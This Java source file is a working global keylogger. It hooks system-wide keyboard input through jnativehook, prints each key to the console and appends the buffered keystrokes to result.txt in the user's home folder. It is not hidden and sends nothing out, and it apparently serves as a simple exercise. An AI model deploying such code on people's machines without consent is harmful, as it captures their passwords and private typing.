package ru.aston;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import java.nio.file.*;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;

public class KeyboardLogger implements NativeKeyListener {

    private final StringBuilder sb = new StringBuilder("Result: ");
    private final Path path = Paths.get(System.getProperty("user.home") +"\\result.txt");

    public static void main(String[] args) throws NativeHookException {

        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);

        GlobalScreen.registerNativeHook();
        GlobalScreen.addNativeKeyListener(new KeyboardLogger());
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        var keyCode = NativeKeyEvent.getKeyText(e.getKeyCode());
        sb.append(keyCode);
        System.out.println("Key Pressed: " + keyCode);
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        var keyCode = NativeKeyEvent.getKeyText(e.getKeyCode());

        if (keyCode.equals("Space") || keyCode.equals("Enter")) {
            try {
                saveToFile();
            } catch (IOException ex) {
                throw new RuntimeException(ex);
            }
        }
        System.out.println("Key Released: " + keyCode);
    }

    public void saveToFile() throws IOException {
        if (!Files.exists(path)) {
            Files.createFile(path);
        }
        Files.writeString(path, sb + "\n", StandardOpenOption.APPEND);
    }
}
